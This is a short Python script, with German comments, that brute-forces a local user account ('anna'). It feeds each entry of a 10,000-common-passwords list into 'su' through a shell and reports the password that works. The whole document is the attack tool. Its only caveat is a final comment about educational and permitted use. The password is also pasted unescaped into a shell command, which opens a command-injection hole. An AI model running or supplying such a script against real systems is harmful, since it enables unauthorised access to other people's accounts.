import subprocess

# Pfad zur Datei mit den 10.000 häufigsten Passwörtern
password_list_path = "./10k-most-common.txt"

# Benutzername, für den das Passwort getestet werden soll
username = "anna"

# Versuchen Sie jedes Passwort aus der Liste
with open(password_list_path, "r") as file:
    for line in file:
        # Strip newline characters und führende/trailing Leerzeichen entfernen
        password = line.strip()
        
        # Versuchen Sie, sich mit dem aktuellen Passwort anzumelden
        command = f"echo '{password}' | su {username} 2>&1"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)
        
        # Überprüfen Sie, ob die Anmeldung erfolgreich war
        if result.returncode == 0:
            print(f"Erfolgreich angemeldet als '{username}' mit dem Passwort '{password}'")
            break  # Beenden Sie die Schleife, wenn ein gültiges Passwort gefunden wurde

# Hinweis: Dieses Skript sollte nur zu Bildungszwecken und mit ausdrücklicher Erlaubnis verwendet werden.
